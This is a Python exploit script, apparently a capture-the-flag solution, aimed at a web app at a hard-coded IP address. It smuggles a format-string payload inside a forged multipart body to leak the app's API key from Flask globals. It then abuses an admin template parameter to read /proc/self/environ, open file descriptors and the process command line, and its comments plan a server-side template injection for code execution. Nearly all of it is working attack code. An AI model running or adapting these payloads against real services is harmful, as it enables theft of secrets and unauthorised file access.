import httpx
import re

TARGET = "http://223.6.249.127:36894"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=10.0)
    return r.text, r.status_code

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # Read /proc/self/environ to get more info
    content, code = read_file_via_admin(api_key, "/proc/self/environ")
    print("\n[*] Environment variables:")
    # Parse null-separated
    for kv in content.split('\x00'):
        if kv:
            print(f"  {kv}")
    
    # Maybe FLAG was passed as env variable at some point?
    # run.sh shows it's written to file and unset
    
    # Let's try reading /proc/self/fd to find open file descriptors
    print("\n[*] Checking /proc/self/fd/...")
    for i in range(20):
        content, code = read_file_via_admin(api_key, f"/proc/self/fd/{i}")
        if code == 200 and content:
            print(f"  fd/{i}: {content[:100]}...")
    
    # Try using /proc/self/root
    print("\n[*] Trying /proc/self/root/flag*...")
    content, code = read_file_via_admin(api_key, "/proc/self/root/")
    print(f"  Status: {code}")
    
    # Let's try to bruteforce or use another technique
    # The SSTI in render_template_string could help us execute code
    # But first we need to find a file that contains our payload
    
    # Using /proc/self/environ doesn't work directly because it contains binary
    # Let's try /proc/self/cmdline
    content, code = read_file_via_admin(api_key, "/proc/self/cmdline")
    print(f"\n[*] cmdline: {content}")
